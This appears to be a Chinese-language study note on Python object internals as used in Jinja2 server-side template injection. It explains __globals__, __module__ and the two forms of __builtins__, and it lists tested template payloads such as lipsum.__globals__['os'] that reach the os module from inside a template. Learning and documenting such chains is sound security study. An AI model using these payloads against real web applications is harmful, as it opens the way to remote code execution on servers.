## 二、知识点

> 完整展开在 [notes/15](../notes/15-Python面向对象模型.md)，这里只留今天新建立起来的直觉。

### 1. `__globals__` 是整条 SSTI 链的枢纽

模板命名空间里没有 `os`、没有 `__import__`；但模板里摸得到的每个函数、每个类，都携带着「它所属模块的全局空间」。

```
函数对象 →(.__globals__)→ 它所在模块的全局字典 →(['os'] 或 ['__builtins__']['__import__']('os'))→ os 模块
```

### 2. `__module__` 与 `__globals__` 的分工

| 属性 | 给什么 | 类型 |
|---|---|---|
| `f.__module__` | 模块的**名字** | `str` |
| `f.__globals__` | 模块的**全局字典本体** | `dict` |

两者可以互相印证：`sys.modules[f.__module__].__dict__ is f.__globals__` → `True`。

### 3. `__builtins__` 有两种形态，写法要兼容

| 场景 | `type(__builtins__)` | 取值写法 |
|---|---|---|
| `__main__` 里 | `module` | `.__builtins__.__import__` |
| 被 import 的模块里 | `dict` | `['__builtins__']['__import__']` |

统一写法：先 `d = b if isinstance(b, dict) else vars(b)`，再 `d['__import__']('os')`。

## 三、案例 / payload

### 1. B4 的两级答案（本机实测）

```python
# 第一级：模块里 import 过 os —— 直接按键取
# lipsum.__module__ == 'jinja2.utils'，实测 'os' in lipsum.__globals__ -> True
os_mod = lipsum.__globals__["os"]              # <module 'os' (frozen)>

# 第二级：没 import 过 —— 走 builtins 里的 __import__ 兜底
b = warnings.catch_warnings.__init__.__globals__["__builtins__"]
d = b if isinstance(b, dict) else vars(b)
os_mod = d["__import__"]("os")                 # <module 'os' (frozen)>
```

### 2. 同一条链放进 Jinja2 模板

```jinja
{{ lipsum.__globals__['os'] }}
{{ lipsum.__globals__['__builtins__']['__import__']('os') }}
{{ lipsum.__globals__.__builtins__.__import__('os') }}
```

模板里没有 `import` 语句可用，只能顺着属性爬 —— 这三行拿到的是同一个 `os`。

### 3. 两个易混语法（实跑确认）

```python
type(('os'))    # <class 'str'>    加括号不改变类型
type(('os',))   # <class 'tuple'>  有逗号才是元组

vars(b)         # 就是 b.__dict__，但 dict 本身没有 __dict__ -> TypeError
```

## 四、踩坑点

| 问题 | 原因 | 解决 |
|---|---|---|
| payload 里 `['os']` 报 `KeyError` | 那个函数所在模块**真的没 import `os`**（如 `warnings`） | 换 `['__builtins__']['__import__']('os')` 兜底 |
| 取到 `object.__init__`，没有 `__globals__` | 类自己没定义 `__init__`，取到的是继承来的槽包装器 `wrapper_descriptor` | 挑**自己写了 `__init__`** 的类，如 `catch_warnings` |
| 以为 `__globals__` 是快照 | 它就是那个模块的 `__dict__` 本体（引用） | 别往里写东西，会污染真模块 |
| `g.os` 想当然 | `dict` 只支持 `[]`，不支持 `.` | 一律写 `['os']` |
